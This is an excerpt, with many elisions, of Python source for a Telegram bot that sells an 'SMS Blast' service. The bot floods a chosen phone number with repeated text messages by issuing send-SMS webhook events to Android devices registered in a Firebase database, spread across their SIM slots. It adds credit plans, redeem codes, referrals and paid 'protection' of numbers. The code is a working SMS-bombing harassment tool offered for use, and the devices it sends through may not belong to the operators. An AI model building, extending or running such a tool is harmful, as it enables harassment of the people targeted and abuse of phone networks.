...
_PROGRESS_UPDATE_INTERVAL = 2.5  # Increased from 1.0
_BACKGROUND_SCAN_INTERVAL = 120.0  # Increased from 60.0
_MAX_CONCURRENT_SENDS = 5  # Limit concurrent sends
...
# File locking for safe data operations
try:
    import fcntl
    HAS_FCNTL = True
except:
...
# Global semaphore for SMS sending
SEND_SEMAPHORE = asyncio.Semaphore(_MAX_CONCURRENT_SENDS)
...
async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.put(
                fb_url.rstrip("/") + f"/clients/{dev_id}/webhookEvent/sendSms.json",
                json={
                    "from": sim_slot,
                    "to": to.strip(),
        ...
        log.warning(f"Timeout sending SMS via {dev_id}")
        return False
    except Exception as e:
        log.warning(f"SMS send error: {e}")
        return False
        ...
        try:
            async with SESSIONS_LOCK:
                ...
                for uid, session in list(USER_SESSIONS.items()):
                    ...
                    elif now - session.start_time > _SESSION_TIMEOUT:
                ...
                for uid in stale_uids:
                    if uid in USER_SESSIONS:
                        ...
                        log.info(f"Cleaned stale session for user {uid}")
        except Exception as e:
                ...
                if not first_scan_done:
                    try:
                        await bot.send_message(
                            ...
                            f"{em(EMOJI_GEAR, '🔄')} Auto-Scan: Every <b>2 Minutes</b>\n"
...
# ========== USER SESSION ==========
class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid', 'progress_msg_id']
...
def owner_kb(d: dict) -> InlineKeyboardMarkup:
    ...
    return InlineKeyboardMarkup(inline_keyboard=[
        ...
        [btn("⚙️ Settings", "owner:settings", EMOJI_GEAR, "⚙️"), btn("📋 SMS History", "owner:sms_history", EMOJI_STAR, "📋")],
...
def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        ...
        [btn("ℹ️ Info", "user:info", EMOJI_GEAR, "ℹ️")],
    ])
...
async def owner_got_count(msg: Message, state: FSMContext):
    ...
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} No devices online! Try later.", reply_markup=kb([("🏠 Home", "owner:home")]), parse_mode="HTML")
        return
...
async def admin_got_count(msg: Message, state: FSMContext):
    ...
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} No devices online! Try later.", reply_markup=kb([("🏠 Home", "admin:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

# ========== SMS BLAST FUNCTION - OPTIMIZED ==========
async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    ...
    async with SEND_SEMAPHORE:
        ...
        # Create progress message with better error handling
        progress_msg = None
        try:
        ...
        async def update_progress(force=False):
            nonlocal last_update_time, progress_valid
            now = time.time()
            
            if not force and (now - last_update_time < _PROGRESS_UPDATE_INTERVAL):
                return True
            ...
            try:
                ...
                if "message to edit not found" in str(e) or "message to edit" in str(e):
                    # User deleted the progress message
        ...
        async def do_send():
            nonlocal sent_ok, sent_fail, msgs_left, last_update_time, progress_valid
            
            try:
                for device in devices:
                    if msgs_left <= 0 or not progress_valid:
                        break
                    ...
                    for sim in sim_slots:
                        # Check conditions before each send
                        if device_sent >= device_quota or msgs_left <= 0 or not progress_valid:
                            break
        ...
        try:
            ...
            # If progress message can't be edited, send new message
            try:
                await msg.answer(
                    f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
                    f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
                ...
                log.error(f"Failed to send final result: {e}")
        except Exception as e:
...
async def owner_videos_add_done(msg: Message, state: FSMContext):
    ...
    if not video_file_id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Send a valid video.", parse_mode="HTML")
        return
...
async def panel_ban_done(msg: Message, state: FSMContext):
    ...
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Cannot ban Admin/Owner!", parse_mode="HTML")
        return
    ...
    await msg.answer(
        f"{em(EMOJI_CROSS, '🚫')} <b>User Banned!</b>\n<code>{ban_id}</code>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(ban_id, f"{em(EMOJI_CROSS, '🚫')} You have been banned. Contact admin.", parse_mode="HTML")
    except:
        pass
...
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    ...
    try:
        await cq.bot.send_message(ban_id, f"{em(EMOJI_CHECK, '✅')} You have been unbanned. Send /start", parse_mode="HTML")
    except:
        pass
...
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    ...
    rows = [
        [btn("➕ Add Plan", "owner:pricing:add", EMOJI_CHECK, "➕")],
        [btn("🗑 Remove Plan", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
        [btn("🔙 Back", "owner:home", EMOJI_GEAR, "🔙")]
    ]
...
async def owner_pricing_price(msg: Message, state: FSMContext):
    ...
    try:
        ...
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Send a valid price (numbers only).", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_credits)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>Step 3/4</b>\n\nCredits to give:\n<i>Example: 100</i>",
        reply_markup=kb([("❌ Cancel", "owner:pricing:menu")]),
        parse_mode="HTML"
    )
...
async def owner_pricing_credits(msg: Message, state: FSMContext):
    ...
    try:
        ...
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Send a valid number.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>Step 4/4</b>\n\nPayment link:\n<i>Example: https://t.me/YourUsername</i>",
        reply_markup=kb([("❌ Cancel", "owner:pricing:menu")]),
        parse_mode="HTML"
    )
...
async def owner_pricing_link(msg: Message, state: FSMContext):
    ...
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Send a valid URL starting with https://", parse_mode="HTML")
        return
...
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    ...
    rows.append([btn("🔙 Back", "owner:pricing:menu", EMOJI_GEAR, "🔙")])
...
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    ...
    rows = [
        [btn("➕ Generate Code", "owner:redeem:gen", EMOJI_CHECK, "➕")],
        [btn("🗑 Delete Code", "owner:redeem:del", EMOJI_CROSS, "🗑")],
        [btn("🔙 Back", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
...
async def owner_redeem_uses(msg: Message, state: FSMContext):
    ...
    try:
        ...
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Send a valid number (1 or more).", parse_mode="HTML")
        return
...
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    ...
    rows.append([btn("🔙 Back", "owner:redeem:menu", EMOJI_GEAR, "🔙")])
...
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    ...
    try:
        await msg.bot.send_message(uid, f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n+{amount} credits added!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>", parse_mode="HTML")
    except:
        pass
...
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    ...
    if success:
        try:
            await msg.bot.send_message(uid, f"{em(EMOJI_WARNING, '⚠️')} <b>Credits Deducted!</b>\n\n-{amount} credits deducted.\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>", parse_mode="HTML")
        except:
            pass
        await msg.answer(
        ...
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Insufficient credits! User has only <b>{get_user_credits(uid, d)}</b> credits.",
            reply_markup=kb([("🔙 Back", "owner:home")]),
            parse_mode="HTML"
        )
...
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    ...
    try:
        ...
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Send a valid positive number.", parse_mode="HTML")
        return
    
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} No users found!", reply_markup=kb([("🔙 Back", "owner:home")]), parse_mode="HTML")
        return
    ...
    notification = f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n{em(EMOJI_GIFT, '🎉')} You received <b>{amount}</b> credits!\n{em(EMOJI_MONEY, '💳')} Check balance with /start"
...
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    ...
    await msg.answer(
        ...
        f"<i>{em(EMOJI_WARNING, '⚠️')} No notification sent.</i>",
        reply_markup=kb([("🔙 Back", "owner:home")]),
        parse_mode="HTML"
    )
...
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    ...
    for number, protector_uid in protected.items():
        ...
        lines.append(f"{em(EMOJI_PHONE, '📞')} <code>{display_number}</code>\n   {em(EMOJI_LOCK, '🔒')} Protected by: <code>{protector_uid}</code> ({protector_name})\n")
    rows = []
    if is_owner_user:
        rows.append([btn("🗑 Remove Protection", "owner:protected_remove", EMOJI_CROSS, "🗑")])
    rows.append([btn("🔙 Back", "owner:home", EMOJI_GEAR, "🔙")])
...
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    ...
    rows.append([btn("🔙 Back", "owner:protected_list", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(
...
async def owner_track_done(msg: Message, state: FSMContext):
    ...
    if not users_who_sent:
        await msg.answer(
            f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n\n{em(EMOJI_CROSS, '❌')} No one has sent SMS to this number yet.",
            reply_markup=kb([("🔙 Back", "owner:home")]),
            parse_mode="HTML"
        )
        return
...
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    ...
    text = (
        ...
        f"{em(EMOJI_GIFT, '🎁')} Referral Credits: <b>{settings.get('ref_credits', 100)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Max Owners: <b>{settings.get('max_owners', 110)}</b>\n\n"
        f"<i>Select an option below to change settings.</i>"
    )
    rows = [
        [btn("🎁 Set Referral Credits", "owner:settings:ref", EMOJI_GIFT, "🎁")],
        [btn("🔙 Back", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
...
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    ...
    rows = [
        [btn("➕ Add Channel", "owner:fj:add", EMOJI_CHECK, "➕")],
        [btn("🗑 Remove Channel", "owner:fj:remove", EMOJI_CROSS, "🗑")],
...
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    ...
    try:
        ...
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Send a valid channel ID (numbers only, e.g. -100xxx).", parse_mode="HTML")
        return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        f"{em(EMOJI_BELL, '🔗')} <b>Step 2/2</b>\n\nInvite link:\n<i>Example: https://t.me/+AbCdEfGhIjK</i>",
        reply_markup=kb([("❌ Cancel", "owner:fj:menu")]),
        parse_mode="HTML"
    )
...
async def owner_fj_add_link(msg: Message, state: FSMContext):
    ...
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Send a valid link starting with https://", parse_mode="HTML")
        return
    fsmd = await state.get_data()
...
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    ...
    rows.append([btn("🔙 Back", "owner:fj:menu", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(
...
async def user_redeem_done(msg: Message, state: FSMContext):
    ...
    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid redeem code!", reply_markup=kb([("🏠 Home", "user:home")]), parse_mode="HTML")
        return
    code_data = codes[code]
    if code_data.get("uses_left", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} This code has expired!", reply_markup=kb([("🏠 Home", "user:home")]), parse_mode="HTML")
        return
    if uid in code_data.get("used_by", []):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} You've already used this code!", reply_markup=kb([("🏠 Home", "user:home")]), parse_mode="HTML")
        return
...
async def user_refer(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        f"Share your referral code and earn <b>{ref_credits}</b> credits per referral!\n\n"
...
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    ...
    rows.append([btn("🔙 Back", "user:home", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    ...
    try:
        ...
        try:
            await bot.send_message(
                ...
                f"⚡ <b>Concurrent Users:</b> {_MAX_CONCURRENT_SENDS}\n"
